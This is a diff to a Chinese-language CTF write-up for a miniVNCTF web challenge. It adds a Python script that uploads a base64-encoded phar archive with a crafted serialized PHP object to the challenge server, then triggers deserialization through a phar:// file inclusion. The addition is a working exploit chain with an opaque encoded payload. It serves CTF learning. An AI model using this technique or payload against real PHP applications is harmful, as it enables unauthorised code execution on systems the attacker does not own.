@@ -345,4 +345,57 @@ base64编码是为了方便我们等下复制上传内容。
 
 ![](assets/miniVNCTF/file-20251207173557953.png)
 运行得到的base64字符串就是我们要上传的内容。
-我们使用python
+我们使用python脚本发包（因为涉及到先上传在包含，用脚本会比较方便）
+```python
+import requests
+import re
+import base64
+
+# ================= 配置 =================
+url = "http://challenge.ilovectf.cn:30218/1.php" 
+
+phar_data_b64 = """
+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
+
+"""
+# =======================================
+
+def attack():
+
+    phar_content = base64.b64decode(phar_data_b64.strip())
+
+    print("[*] 1. 上传 Payload ")
+
+    # Step 1: 上传 (Mode 'w')
+    data1 = {
+        '0': phar_content,
+        '1': 'O:3:"aaa":1:{s:4:"mode";s:1:"w";}'
+    }
+    r1 = requests.post(url, data=data1)
+
+    # 提取上传后的临时文件名
+    match = re.search(r'(/var/www/html/[a-f0-9]{32}\.phar)', r1.text)
+    if not match:
+        print("[!] 上传失败，未找到路径。")
+        print(r1.text)
+        return
+
+    filename = match.group(1)
+    print(f"[+] 上传成功，路径: {filename}")
+
+    # Step 2: 触发反序列化 (Mode 'r')
+    print(f"[*] 2. 触发 文件包含 ...")
+
+    phar_path = f"phar://{filename}/test.txt"
+
+    data2 = {
+        '0': phar_path,
+        '1': 'O:3:"aaa":1:{s:4:"mode";s:1:"r";}'
+    }
+    r2 = requests.post(url, data=data2)
+
+    print(r2.text)
+
+if __name__ == "__main__":
+    attack()
+```
